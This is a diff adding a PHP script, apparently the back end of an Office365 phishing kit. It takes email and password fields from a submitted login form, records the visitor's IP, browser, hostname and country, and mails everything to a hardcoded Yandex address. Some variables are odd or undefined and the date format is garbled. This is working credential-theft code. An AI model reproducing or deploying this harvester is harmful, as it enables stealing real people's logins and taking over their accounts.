@@ -1,0 +1,48 @@
+<?php
+$ip = getenv("REMOTE_ADDR");
+$timedate = date("D/M/d, Y g(idea) a"); 
+$country = visitor_country();
+$browserAgent = $_SERVER['HTTP_USER_AGENT'];
+$hostname = gethostbyaddr($ip);
+$message .= "*****************New Login Details*****************\n";
+$message .= "Email Address:             : ".$_POST['ai']."\n";
+$kiss = $_POST['ai'];
+$om = $_POST['pink'];
+$message .= "Password:             : ".$_POST['pr']."\n";
+$message .= "***************FROSTED WRIST***************\n";
+$message .= "|Client IP: ".$ip."\n";
+$message .= "Browser                :".$browserAgent."\n";
+$message .= "DateTime                    : ".$timedate."\n";
+$message .= "country                    : ".$country."\n";
+$message .= "HostName : ".$hostname."\n";
+$message .= "************************FROSTED WRIST************************\n";
+$send = "jasonsam5657@yandex.com";
+$subject = "OFFICE365 | $country | $ip";
+$headers = "From: Office365 2025";
+$headers .= $_POST['stress']."\n";
+$headers .= "MIME-Version: 1.0\n";
+$arr=array($send, $IP);
+foreach ($arr as $send)
+{
+mail($send,$subject,$message,$headers);
+mail($to,$subject,$message,$headers);
+}
+function visitor_country()
+	{
+	$ip = getenv("REMOTE_ADDR");
+	$result = "Unknown";
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	$country = json_decode(curl_exec($ch))->country;
+	if ($country != null)
+		{
+		$result = $country;
+		}
+
+	return $result;
+	}
+
+
+	 
+?>
